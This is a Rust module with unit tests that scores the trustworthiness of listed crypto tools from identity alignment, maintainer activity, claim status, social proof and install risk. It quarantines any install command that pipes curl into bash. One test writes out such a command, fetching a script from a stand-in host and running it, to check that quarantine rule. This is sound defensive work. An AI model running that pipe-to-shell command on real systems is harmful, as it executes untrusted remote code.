//! Trust verification — operator-facing scores and public explainable trust facts.

use std::collections::HashSet;

use crate::models::{Tool, ToolOfficialLink};

/// Normalize an identity token for cross-source comparison (org, scope, domain label).
pub fn normalize_identity_token(value: &str) -> String {
    value
        .trim()
        .to_lowercase()
        .trim_start_matches('@')
        .chars()
        .filter(|c| *c != '-' && *c != '_')
        .collect()
}

/// Extract `github.com/{org}/...` org segment.
pub fn parse_github_org(repo_url: &str) -> Option<String> {
    let parsed = url::Url::parse(repo_url).ok()?;
    if parsed.host_str()? != "github.com" {
        return None;
    }
    let org = parsed.path_segments()?.next()?;
    if org.is_empty() {
        return None;
    }
    Some(org.to_string())
}

/// Extract scoped npm package namespace (`@scope/pkg` -> `scope`).
pub fn parse_npm_scope(npm_package: &str) -> Option<String> {
    let trimmed = npm_package.trim();
    if !trimmed.starts_with('@') {
        return None;
    }
    let (scope, _) = trimmed.split_once('/')?;
    Some(scope.trim_start_matches('@').to_string())
}

/// Extract homepage host label (strip `www.`).
pub fn parse_homepage_domain_label(homepage: &str) -> Option<String> {
    let parsed = url::Url::parse(homepage).ok()?;
    let host = parsed.host_str()?.trim_start_matches("www.");
    host.split('.').next().map(str::to_string)
}

fn identity_tokens_related(left: &str, right: &str) -> bool {
    let a = normalize_identity_token(left);
    let b = normalize_identity_token(right);
    if a.is_empty() || b.is_empty() {
        return false;
    }
    a == b || a.contains(&b) || b.contains(&a)
}

/// True when GitHub org, npm scope, and homepage domain label refer to the same identity cluster.
pub fn identity_cluster_aligned(repo_url: &str, homepage: &str, npm_package: &str) -> bool {
    let Some(github_org) = parse_github_org(repo_url) else {
        return false;
    };
    let Some(npm_scope) = parse_npm_scope(npm_package) else {
        return false;
    };
    let Some(domain_label) = parse_homepage_domain_label(homepage) else {
        return false;
    };

    identity_tokens_related(&github_org, &npm_scope)
        && (identity_tokens_related(&github_org, &domain_label)
            || identity_tokens_related(&npm_scope, &domain_label))
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
pub struct TrustFact {
    pub label: String,
    pub detail: String,
    pub severity: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
pub struct TrustVerificationResult {
    pub total_score: i32,
    pub identity_score: i32,
    pub operational_score: i32,
    pub install_safety_score: i32,
    pub claim_strength_score: i32,
    pub social_presence_score: i32,
    pub trust_facts: Vec<TrustFact>,
    pub evidence_gaps: Vec<String>,
    pub suggested_action: String,
}

/// Compute trust breakdown and public-safe facts from tool row and official links.
pub fn verify_tool_trust(
    tool: &Tool,
    official_links: &[ToolOfficialLink],
) -> TrustVerificationResult {
    if tool
        .install_command
        .as_deref()
        .is_some_and(|cmd| cmd.contains("curl ") && cmd.contains("| bash"))
    {
        return TrustVerificationResult {
            total_score: 0,
            identity_score: 0,
            operational_score: 0,
            install_safety_score: 0,
            claim_strength_score: 0,
            social_presence_score: 0,
            trust_facts: vec![],
            evidence_gaps: vec!["unsafe install requires quarantine".into()],
            suggested_action: "quarantine".into(),
        };
    }

    let mut identity_score = 0;
    let mut operational_score = 0;
    let install_safety_score = if tool.install_risk_level == "critical" {
        0
    } else if tool.install_risk_level == "high" {
        20
    } else {
        40
    };
    let mut claim_strength_score = 0;
    let mut social_presence_score = 0;
    let mut trust_facts = Vec::new();
    let mut evidence_gaps = Vec::new();

    let identity_aligned = tool
        .repo_url
        .as_deref()
        .zip(tool.homepage.as_deref())
        .zip(tool.npm_package.as_deref())
        .is_some_and(|((repo, homepage), npm)| identity_cluster_aligned(repo, homepage, npm));

    if identity_aligned {
        identity_score += 30;
        trust_facts.push(TrustFact {
            label: "Domain and org aligned".into(),
            detail: "GitHub org, npm scope, and homepage domain refer to the same identity cluster"
                .into(),
            severity: "positive".into(),
        });
    } else {
        evidence_gaps.push("identity alignment needs operator review".into());
    }

    if tool
        .last_commit_at
        .is_some_and(|at| at > chrono::Utc::now() - chrono::TimeDelta::days(7))
    {
        operational_score += 20;
        trust_facts.push(TrustFact {
            label: "Recent activity".into(),
            detail: "Maintainer activity seen in the last 7 days".into(),
            severity: "positive".into(),
        });
    } else {
        evidence_gaps.push("recent maintainer activity not confirmed".into());
    }

    if tool.claim_state == "claimed" {
        claim_strength_score += 20;
        trust_facts.push(TrustFact {
            label: "Claimed by team".into(),
            detail: "Maintainer claim has been approved by operators".into(),
            severity: "positive".into(),
        });
    }

    if official_links
        .iter()
        .any(|link| link.link_type == "x" && link.verification_status == "verified")
    {
        social_presence_score += 10;
    } else {
        evidence_gaps.push("official X proof missing".into());
    }

    if tool.install_risk_level == "low" || tool.install_risk_level == "medium" {
        trust_facts.push(TrustFact {
            label: "Verified install command".into(),
            detail: "Install command passed deterministic safety checks".into(),
            severity: "positive".into(),
        });
    }

    let total_score = identity_score
        + operational_score
        + install_safety_score
        + claim_strength_score
        + social_presence_score;

    let suggested_action = if total_score >= 75 {
        "approve_community"
    } else {
        "needs_manual_research"
    };

    TrustVerificationResult {
        total_score,
        identity_score,
        operational_score,
        install_safety_score,
        claim_strength_score,
        social_presence_score,
        trust_facts,
        evidence_gaps,
        suggested_action: suggested_action.into(),
    }
}

/// Whether strong proof exists to allow marking a tool official (operator gate).
pub fn official_promotion_allowed(
    tool: &Tool,
    official_links: &[ToolOfficialLink],
    trust: &TrustVerificationResult,
) -> bool {
    if tool.claim_state != "claimed" {
        return false;
    }
    let verified_count = official_links
        .iter()
        .filter(|l| l.verification_status == "verified" && l.evidence_strength == "strong")
        .map(|l| (&l.link_type, l.url.as_str()))
        .collect::<HashSet<_>>()
        .len();
    verified_count >= 2 && trust.claim_strength_score >= 20
}

/// Join trust facts into a single summary string (no numeric scores).
pub fn trust_fact_summary_text(facts: &[TrustFact]) -> String {
    facts
        .iter()
        .map(|fact| format!("{} — {}", fact.label, fact.detail))
        .collect::<Vec<_>>()
        .join(" | ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;

    fn demo_tool() -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::nil(),
            name: "BOB Gateway CLI".into(),
            slug: "bob-gateway-cli".into(),
            description: Some("Bridge CLI for Bitcoin and EVM chains".into()),
            function: "bridge".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: "cli".into(),
            repo_url: Some("https://github.com/gobob/bob".into()),
            homepage: Some("https://gobob.xyz".into()),
            npm_package: Some("@gobob/gateway-cli".into()),
            install_command: Some("npx @gobob/gateway-cli".into()),
            mcp_endpoint: None,
            chains: vec!["bitcoin".into(), "base".into()],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 82,
            crypto_relevance_reasons: vec!["npm scope matches github org".into()],
            relevance_status: "accepted".into(),
            install_risk_level: "low".into(),
            install_risk_reasons: vec!["npx install command".into()],
            requires_secret: false,
            safe_copy_command: Some("npx @gobob/gateway-cli".into()),
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: Some("MIT".into()),
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            x402_endpoint: None,
            x402_last_checked_at: None,
            x402_check_failures: 0,
            stars: 120,
            last_commit_at: Some(chrono::Utc::now() - chrono::TimeDelta::days(2)),
            source: "npm".into(),
            source_url: Some("https://www.npmjs.com/package/@gobob/gateway-cli".into()),
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn trust_verification_promotes_explainable_facts() {
        let tool = demo_tool();
        let result = verify_tool_trust(&tool, &[]);
        assert!(result.total_score >= 70);
        assert!(result
            .trust_facts
            .iter()
            .any(|fact| fact.label == "Recent activity"));
        assert!(result
            .trust_facts
            .iter()
            .any(|fact| fact.label == "Domain and org aligned"));
    }

    #[test]
    fn trust_verification_hard_vetoes_curl_bash() {
        let mut tool = demo_tool();
        tool.install_command = Some("curl https://bad.sh | bash".into());
        let result = verify_tool_trust(&tool, &[]);
        assert_eq!(result.suggested_action, "quarantine");
        assert!(result
            .evidence_gaps
            .iter()
            .any(|gap| gap.contains("unsafe install")));
    }

    #[test]
    fn identity_cluster_aligned_requires_cross_source_match() {
        assert!(identity_cluster_aligned(
            "https://github.com/gobob/bob",
            "https://gobob.xyz",
            "@gobob/gateway-cli"
        ));
        assert!(!identity_cluster_aligned(
            "https://github.com/bob-collective/bob",
            "https://gobob.xyz",
            "@gobob/gateway-cli"
        ));
    }

    #[test]
    fn trust_verification_skips_domain_aligned_when_org_mismatch() {
        let mut tool = demo_tool();
        tool.repo_url = Some("https://github.com/bob-collective/bob".into());
        let result = verify_tool_trust(&tool, &[]);
        assert!(!result
            .trust_facts
            .iter()
            .any(|fact| fact.label == "Domain and org aligned"));
    }

    #[test]
    fn public_trust_facts_hide_raw_numeric_score() {
        let facts = vec![TrustFact {
            label: "Claimed by team".into(),
            detail: "Maintainer claim approved by operators".into(),
            severity: "positive".into(),
        }];
        let html = trust_fact_summary_text(&facts);
        assert!(html.contains("Claimed by team"));
        assert!(!html.contains("81"));
    }
}
